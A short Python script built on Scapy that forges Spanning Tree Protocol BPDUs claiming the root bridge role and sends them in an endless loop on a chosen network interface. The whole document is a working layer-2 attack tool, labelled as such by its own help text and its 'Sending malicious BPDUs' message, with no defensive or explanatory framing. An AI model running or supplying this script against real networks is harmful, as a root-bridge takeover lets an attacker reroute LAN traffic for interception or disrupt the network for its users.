#!/usr/bin/env python3

#Import Scapy
from scapy.all import *
from scapy.layers.l2 import *
import argparse

data = 'STP'
STPMulticast = "01:80:C2:00:00:00"

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", dest="interface", type=str, required=True, help="Choose the interface to attack")
    args = parser.parse_args()
    return args

def malicious_stp(interface):
    frame = Ether(src="00:00:00:00:00:11", dst=STPMulticast)
    frame /= LLC()/STP(rootmac="00:00:00:00:00:11", bridgemac="00:00:00:00:00:11")/data
    print ("Sending malicious BPDUs...")
    sendp(frame, iface=args.interface, inter=3, loop=1, verbose=1)


args = get_arguments()
malicious_stp(args.interface)
